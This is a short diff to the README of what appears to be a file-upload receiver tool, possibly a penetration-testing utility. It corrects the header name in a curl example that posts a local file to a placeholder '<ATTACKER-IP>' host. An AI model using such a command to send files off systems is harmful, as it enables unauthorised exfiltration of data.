@@ -53,7 +53,7 @@ This will generate a new api key on startup and after each request.
 The key is printed to the console and has to be passed 
 as `X-API-KEY` header:
 ```bash
-curl -H "X-Api-Key: F94CE8F8-2E28-7806-94A4-8DF3FB722814" -F 'file=@<FILENAME>' http://<ATTACKER-IP>/
+curl -H "X-API-KEY: F94CE8F8-2E28-7806-94A4-8DF3FB722814" -F 'file=@<FILENAME>' http://<ATTACKER-IP>/
 ```
 
 ### Port
